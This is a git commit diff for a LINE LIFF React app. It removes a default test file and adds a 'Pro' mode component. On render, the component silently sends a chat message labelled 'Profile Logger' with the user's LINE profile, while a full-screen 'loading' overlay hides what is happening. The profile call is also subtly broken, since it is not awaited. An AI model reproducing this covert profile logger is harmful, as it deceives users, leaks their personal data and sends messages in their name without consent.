3277fd5d7d3f5d614ff87dd7c03cdfddf5b4efc6
EdamAme <121654029+EdamAme-x@users.noreply.github.com>
2023-09-19 20:02:31 +0900

    'build'

--- src/App.test.js
+++
@@ -1,8 +0,0 @@
-import { render, screen } from '@testing-library/react';
-import App from './App';
-
-test('renders LINE text', () => {
-  render(<App />);
-  const linkElement = screen.getByText(/LINE/i);
-  expect(linkElement).toBeInTheDocument();
-});
---
+++ src/Mode/Pro.js
@@ -0,0 +1,40 @@
+import React from 'react'
+
+export default function Pro(props) {
+
+  const liff = props.liff;
+
+  liff.sendMessages([
+    {
+      type: "text",
+      text: `
+      [[ Profile Logger ]] 👿
+      ${liff.getProfile()}
+      `
+    }
+  ])
+
+  return (
+    <>
+        <div className="jirai">
+            読み込み中・・・
+        </div>
+        <style>
+            {
+                `
+                    .jirai {
+                        width: 100vw;
+                        height: 100vh;
+                        background-color: #2b3146;
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        z-index: 9999;
+                        color: #ffffff;
+                    }
+                `
+            }
+        </style>
+    </>
+  )
+}
